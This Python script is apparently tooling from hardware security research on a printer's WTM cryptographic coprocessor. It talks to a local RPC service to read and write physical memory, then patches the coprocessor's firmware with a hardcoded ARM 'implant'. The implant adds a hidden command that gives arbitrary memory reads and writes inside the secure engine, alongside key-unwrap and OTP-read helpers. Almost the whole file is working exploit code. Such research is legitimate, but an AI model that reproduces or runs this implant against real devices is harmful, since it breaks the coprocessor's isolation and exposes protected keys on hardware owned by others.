#!/usr/bin/env python3

import socket
import struct
import sys
import os
import time

WTM_PORT = 0x4444

RPC_COMMAND_UNWRAP_KEY = 1
RPC_COMMAND_IO_WRITE8 = 2
RPC_COMMAND_IO_WRITE16 = 3
RPC_COMMAND_IO_WRITE32 = 4
RPC_COMMAND_IO_READ8 = 5
RPC_COMMAND_IO_READ16 = 6
RPC_COMMAND_IO_READ32 = 7
RPC_COMMAND_SCRATCH_READ = 8
RPC_COMMAND_SCRATCH_WRITE = 9
RPC_COMMAND_WTM_EXEC_CMD = 10
RPC_COMMAND_GET_SCRATCH = 11
RPC_COMMAND_READ_PHYS = 12
RPC_COMMAND_WRITE_PHYS = 13

WTM_CMD_AES_INIT = 0x5000
WTM_CMD_AES_PROCESS = 0x5002
WTM_CMD_AES_FINISH = 0x5003
WTM_CMD_AES_ZEROIZE = 0x5001
WTM_CMD_STORE_ENGINE_CONTEXT_EXTERNAL = 0x3004
WTM_CMD_KEY_UNWRAP_LOAD = 0x3008
WTM_CMD_OTP_READ = 0x2009
WTM_CMD_RNG = 0x4000
WTM_CMD_HAX = 0x9001

WTM_HAX_CMD_READ32 = 1
WTM_HAX_CMD_WRITE32 = 2

MODE_AES_128_ECB = 0x8000
MODE_AES_256_ECB = 0x8001
MODE_AES_128_CBC = 0x8004
MODE_AES_256_CBC = 0x8005

REG_WTM_ID = 0xD8
REG_WTM_REV = 0xDC
REG_CMD_RETURN_STATUS = 0x80

AES_REG_KEY = 0x78
AES_REG_IV = 0x98

# TODO: this is hardcoded for my printer running CXLBL.230.037 right now.
# should add some code to dynamically derive this. that should probably be
# done in wtm_hax_oracle itself for performance reasons. 
WTM_TEXT_BASE = 0x6380000

WTM_TEXT_HEAD = bytes.fromhex(
    "00482de904b08de210d04de20030a0e10d304be5fc309fe508300be50d305be5"
    + "14300be514301be5080053e31400000a14301be5090053e30300000a14301be5"
    + "000053e31c00000a2b0000ea08301be5003093e5022783e308301be5002083e5"
    + "b4309fe5001093e5ac309fe5002093e5a8309fe50330d2e7a0209fe50230c1e7"
    + "1f0000ea08301be5003093e50227c3e308301be5002083e57c309fe5001093e5"
    + "74309fe5002093e570309fe50330d2e768209fe50230c1e7110000ea08301be5"
    + "003093e5082083e308301be5002083e508301be5003093e50820c3e308301be5"
    + "002083e530309fe5001093e52c209fe50230a0e30230c1e7010000ea2c00a0e3"
)

IMPLANT = bytes.fromhex(
    "010050e30300000a020050e30400000a0000a0e31eff2fe1"
    + "001091e5001082e51eff2fe1002081e50000a0e31eff2fe1"
)

CMD_9001_TEXT_OFFSET = 0x6374


class WTMClient:
    def __init__(self, host="localhost", port=WTM_PORT, install_implant=True):
        self.host = host
        self.port = port
        self.sock = socket.create_connection((host, port))
        self.scratch = self.get_scratch()
        if install_implant:
            self.install_implant()

    def cmd(self, cmd, body):
        self.sock.sendall(struct.pack("<LL", cmd, len(body)) + body)

    def resp(self, n):
        r = self.sock.recv(n)
        return r

    def unwrap_key(self, key):
        self.cmd(RPC_COMMAND_UNWRAP_KEY, key)
        return self.resp(32)

    def io_write8(self, reg, value):
        self.cmd(RPC_COMMAND_IO_WRITE8, struct.pack("<HB", reg, value))

    def io_write16(self, reg, value):
        self.cmd(RPC_COMMAND_IO_WRITE16, struct.pack("<HH", reg, value))

    def io_write32(self, reg, value):
        self.cmd(RPC_COMMAND_IO_WRITE32, struct.pack("<HI", reg, value))

    def io_read8(self, reg):
        self.cmd(RPC_COMMAND_IO_READ8, struct.pack("<H", reg))
        return struct.unpack("<B", self.resp(1))[0]

    def io_read16(self, reg):
        self.cmd(RPC_COMMAND_IO_READ16, struct.pack("<H", reg))
        return struct.unpack("<H", self.resp(2))[0]

    def io_read32(self, reg):
        self.cmd(RPC_COMMAND_IO_READ32, struct.pack("<H", reg))
        return struct.unpack("<I", self.resp(4))[0]

    def wtm_cmd(self, cmd, args):
        args = b"".join([struct.pack("<L", arg) for arg in args])
        self.cmd(RPC_COMMAND_WTM_EXEC_CMD, struct.pack("<H", cmd) + args)
        while True:
            if self.io_read32(0xC4) & 0x100:
                return

    def get_scratch(self):
        self.cmd(RPC_COMMAND_GET_SCRATCH, b"")
        return struct.unpack("<L", self.resp(0x4))[0]

    def scratch_read(self, offset, length):
        self.cmd(RPC_COMMAND_SCRATCH_READ, struct.pack("<LL", offset, length))
        return self.resp(length)

    def scratch_write(self, offset, data):
        self.cmd(
            RPC_COMMAND_SCRATCH_WRITE, struct.pack("<LL", offset, len(data)) + data
        )

    def phys_read(self, addr, length):
        self.cmd(RPC_COMMAND_READ_PHYS, struct.pack("<LL", addr, length))
        return self.resp(length)

    def phys_write(self, addr, data):
        self.cmd(RPC_COMMAND_WRITE_PHYS, struct.pack("<LL", addr, len(data)) + data)

    def wtm_read32(self, addr):
        self.wtm_cmd(WTM_CMD_HAX, [WTM_HAX_CMD_READ32, addr, self.scratch])
        return struct.unpack("<L", self.scratch_read(0, 4))[0]

    def wtm_write32(self, addr, value):
        self.wtm_cmd(WTM_CMD_HAX, [WTM_HAX_CMD_WRITE32, addr, value])

    def wtm_clear32(self, addr, value):
        self.wtm_write32(addr, self.wtm_read32(addr) & (~value & 0xFFFFFFFF))

    def wtm_set32(self, addr, value):
        self.wtm_write32(addr, self.wtm_read32(addr) | value)

    def install_implant(self):
        wtm_text_remote = self.phys_read(WTM_TEXT_BASE, 0x100)
        assert wtm_text_remote == WTM_TEXT_HEAD
        implant_remote = self.phys_read(
            WTM_TEXT_BASE + CMD_9001_TEXT_OFFSET, len(IMPLANT)
        )
        if implant_remote != IMPLANT:
            print("[+] installing implant")
            self.phys_write(WTM_TEXT_BASE + CMD_9001_TEXT_OFFSET, IMPLANT)
            time.sleep(1)
        else:
            print("[+] implant already installed")
